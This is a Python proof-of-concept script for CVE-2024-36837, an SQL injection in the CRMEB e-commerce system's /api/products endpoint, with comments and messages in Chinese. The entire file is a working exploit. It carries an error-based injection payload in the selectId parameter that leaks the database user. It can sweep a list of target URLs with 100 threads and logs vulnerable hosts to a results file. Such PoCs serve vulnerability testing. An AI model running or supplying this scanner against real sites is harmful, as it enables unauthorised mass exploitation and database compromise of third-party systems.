import requests,argparse,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()


def banner():
    test = """
                                                       ______
        ______________________________________________ ___  /
        ___  __ \  _ \_  ___/_  ___/  __ \_  __ \  __ `/_  / 
        __  /_/ /  __/  /   _(__  )/ /_/ /  / / / /_/ /_  /  
        _  .___/\___//_/    /____/ \____//_/ /_/\__,_/ /_/   
        /_/                                                  
                                           author:lly
                                           date:2024-09-12
                                           version:1.0                    
        """
    print(test)

def main():
    banner()
    parser = argparse.ArgumentParser(description='CRMEB开源电商系统 apiproducts SQL注入漏洞(CVE-2024-36837)')
    parser.add_argument('-u','--url',dest='url',type=str,help='please input your link')
    parser.add_argument('-f','--file',dest='file',type=str,help='please input your file path')
    args = parser.parse_args()
    #判断输入的参数是单个还是文件
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list=[]
        with open(args.file,"r",encoding="utf-8") as f:
            for url in f.readlines():
                url_list.append(url.strip().replace("\n",""))
        #多线程
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"您的输入有误，请使用python file_name.py -h for help")

def poc(target):
    payload = "/api/products?limit=20&priceOrder=&salesOrder=&selectId=GTID_SUBSET(CONCAT(0x7e,(SELECT+(ELT(3550=3550,user()))),0x7e),3550)"
    url = target+payload
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36",
        "Accept-Encoding": "gzip, deflate",
        "Accept": "*/*"
    }
    proxies = {
        'http':'http://127.0.0.1:8080',
        'https':'http://127.0.0.1:8080'
    }

    try:
        re = requests.get(url=url,headers=headers,verify=False,proxies=proxies,timeout=20)
        if re.status_code == 200 and '"status":400' in re.text:
            print( f"[+] {target} 存在SQL注入漏洞！")
            with open('result.txt',mode='a',encoding='utf-8')as ft:
                ft.write(target+'\n')
        else:
            print(f'该{target}不存在SQL注入漏洞')
    except Exception as e:
        print(f"[*] 该url出现错误:{target}, 错误信息：{str(e)}")


if __name__ == '__main__':
    main()